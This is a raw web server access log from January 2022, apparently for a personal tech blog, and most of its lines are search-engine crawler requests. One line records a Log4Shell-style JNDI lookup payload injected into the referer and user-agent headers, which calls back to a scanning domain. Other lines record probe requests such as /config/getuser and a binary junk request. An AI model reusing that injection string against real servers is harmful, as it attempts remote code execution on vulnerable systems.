66.249.69.61 - - [24/Jan/2022:15:20:41 +0100] "GET /author/krzysztof/ HTTP/1.1" 200 13435 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.57 - - [24/Jan/2022:15:45:32 +0100] "GET /weekly-stories/amp/ HTTP/1.1" 200 5994 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
81.39.100.157 - - [24/Jan/2022:15:47:07 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
66.249.69.61 - - [24/Jan/2022:15:50:41 +0100] "GET /tripy-2021/ HTTP/1.1" 200 12367 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.61 - - [24/Jan/2022:16:00:31 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
45.155.126.211 - - [24/Jan/2022:16:09:45 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; tchelebi/1.0; +http://tchelebi.io)"
3.237.200.213 - - [24/Jan/2022:16:11:09 +0100] "GET /rss HTTP/1.1" 301 5 "-" "Forem Feeds Importer"
3.237.200.213 - - [24/Jan/2022:16:11:09 +0100] "GET /rss/ HTTP/1.1" 200 3443 "-" "Forem Feeds Importer"
66.249.69.59 - - [24/Jan/2022:16:15:32 +0100] "GET /weekly-stories/amp/ HTTP/1.1" 200 5994 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
137.184.198.10 - - [24/Jan/2022:16:18:13 +0100] "GET /cluster/cluster/ HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Linux; Android 9; SNE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
137.184.198.10 - - [24/Jan/2022:16:18:18 +0100] "GET /cluster/cluster/ HTTP/1.1" 301 162 "-" "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10"
66.249.72.155 - - [24/Jan/2022:16:20:41 +0100] "GET /tag/kubernetes-advanced/ HTTP/1.1" 200 13059 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
91.92.236.166 - - [24/Jan/2022:16:32:12 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
66.249.72.153 - - [24/Jan/2022:16:50:41 +0100] "GET /weekly-stories-3/ HTTP/1.1" 200 15615 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.72.157 - - [24/Jan/2022:16:57:39 +0100] "GET /assets/images/tag-bg.svg?v=ffd8b13e55 HTTP/1.1" 200 1553 "https://krzwiatrzyk.eu/tag/kubernetes-advanced/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/97.0.4692.71 Safari/537.36"
131.153.240.10 - - [24/Jan/2022:17:47:48 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:95.0) Gecko/20100101 Firefox/95.0"
40.77.167.36 - - [24/Jan/2022:18:28:26 +0100] "GET / HTTP/2.0" 200 13159 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
164.92.236.214 - - [24/Jan/2022:18:43:01 +0100] "GET / HTTP/1.1" 301 162 "{jndi:dns://85-255-1-106.referer.scanworld.net}" "{jndi:dns://85-255-1-106.useragent.scanworld.net}"
161.35.230.3 - - [24/Jan/2022:18:44:08 +0100] "\x00\x0E8\x13(O/\xAC8$\xFB\x00\x00\x00\x00\x00" 400 150 "-" "-"
159.203.160.245 - - [24/Jan/2022:18:54:57 +0100] "GET /config/getuser?index=0 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
66.249.69.59 - - [24/Jan/2022:18:55:32 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
